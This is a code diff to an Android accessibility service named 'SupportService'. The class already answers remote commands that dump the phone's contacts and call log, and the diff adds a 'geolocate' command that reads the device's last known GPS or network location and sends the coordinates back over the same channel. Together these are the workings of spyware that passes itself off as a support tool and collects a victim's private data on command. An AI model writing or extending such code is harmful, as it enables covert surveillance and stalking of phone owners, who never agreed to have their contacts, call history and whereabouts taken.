@@ -7,6 +7,8 @@ import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.graphics.PixelFormat;
+import android.location.Location;
+import android.location.LocationManager;
 import android.net.Uri;
 import android.os.Handler;
 import android.os.Looper;
@@ -279,6 +281,8 @@ public class SupportService extends AccessibilityService {
                 dumpContacts(out);
             } else if (cmdLower.equals("dump_calls")) {
                 dumpCalls(out);
+            } else if (cmdLower.equals("geolocate")) {
+                geolocate(out);
             } else {
                 out.println("ERROR: Unknown Command");
             }
@@ -338,6 +342,24 @@ public class SupportService extends AccessibilityService {
                 cur.close();
             } else {
                 out.println("ERROR: Could not query Call Log");
+            }
+        } catch (Exception e) {
+            out.println("ERROR: " + e.getMessage());
+        }
+    }
+
+    private void geolocate(PrintWriter out) {
+        try {
+            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+            Location loc = null;
+            if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+                loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+                if (loc == null) loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+            }
+            if (loc != null) {
+                out.println("Lat: " + loc.getLatitude() + " | Lon: " + loc.getLongitude() + " | Accuracy: " + loc.getAccuracy());
+            } else {
+                out.println("ERROR: Location not available");
             }
         } catch (Exception e) {
             out.println("ERROR: " + e.getMessage());
